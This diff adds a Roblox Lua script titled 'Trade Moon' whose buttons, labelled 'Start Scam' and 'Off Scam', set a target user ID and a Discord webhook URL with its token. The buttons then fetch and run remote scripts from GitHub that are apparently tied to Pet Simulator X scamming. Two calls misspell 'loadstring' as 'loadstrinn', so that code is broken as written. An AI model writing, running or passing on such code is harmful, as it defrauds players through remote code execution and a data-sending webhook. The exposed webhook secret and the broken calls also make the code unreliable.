@@ -1,0 +1,20 @@
+local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local window = kavoUi.CreateLib("Trade Moon","BloodTheme")
+
+---Tabs
+
+local Tab1 = window:NewTab("MAIN")
+local Tab1Section = Tab1:NewSection("MAIN")
+
+---Buttons
+
+Tab1Section:NewButton("ON","Start Scam",function()
+_G.UserID = 3351083566
+_G.WebHook = "https://discord.com/api/webhooks/1069262255822213190/Ya8AsqIP0yPn2ax25hXdR774kNQrVcDYAbEAOxMj5e46IHPK24SHRqggG8Atm22oWMze"
+loadstrinn(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
+end)
+
+Tab1Section:NewButton("OFF","Off Scam",function()
+_G.Key = "Lonky_Lanky"
+loadstrinn(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/NewPsxScript/main/PsxLoader"))()
+end)
